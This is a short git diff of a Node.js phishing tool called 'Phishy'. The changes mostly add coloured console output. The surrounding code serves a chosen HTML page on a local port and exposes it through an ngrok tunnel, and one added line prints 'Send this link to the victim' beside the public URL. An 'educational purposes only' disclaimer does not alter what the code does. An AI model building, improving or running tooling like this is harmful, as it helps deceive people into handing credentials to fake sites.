@@ -4,16 +4,27 @@
 
 const fs = require('fs');
 const http = require('http');
+const chalk = require('chalk');
 const ngrok = require('ngrok');
 const inquirer = require('inquirer');
-const { exec } = require('child_process');
+
+const log = console.log;
 
 const PORT = 8080;
 
-console.log(`
+const warning = chalk.bold.red;
+const error = chalk.bold.underline.yellow;
+const primaryColor = chalk.hex('#3577ff');
+
+log(warning(`
+    
     :: Disclaimer: Developers assume no liability and are not ::
     :: responsible for any misuse or damage caused by Phishy. ::
     :: Only use for educational purposes!                     ::
+
+`))
+
+log(primaryColor.bold(`
 
                      .                  Twitter | https://www.twitter.com/ant_devs
                     ":"                   
@@ -26,10 +37,13 @@ console.log(`
         ██████  ███████ ██ ███████ ███████   ████   
         ██      ██   ██ ██      ██ ██   ██    ██    
         ██      ██   ██ ██ ███████ ██   ██    ██                                            
-`);
+`));
 
 
 const ngrokStart = async () => {
+
+    log(primaryColor.bold('[*] Starting ngrok server...'))
+
     const url = await ngrok.connect({
         proto: 'http',
         addr: PORT
@@ -62,7 +76,7 @@ inquirer
 
         const website = ans.split(' ').join('').toLowerCase();
         
-        ngrokStart().then((url) => console.log(url))
+        ngrokStart().then((url) => log(primaryColor.bold('[*] Send this link to the victim: %s'), chalk.white(url)))
 	});
 
 http.createServer((req, res) => {
@@ -70,7 +84,5 @@ http.createServer((req, res) => {
         res.writeHead(200, {'Content-Type': 'text/html'});
         res.write(data);
         res.end();
-    })
-
+    }) 
 }).listen(PORT);
-
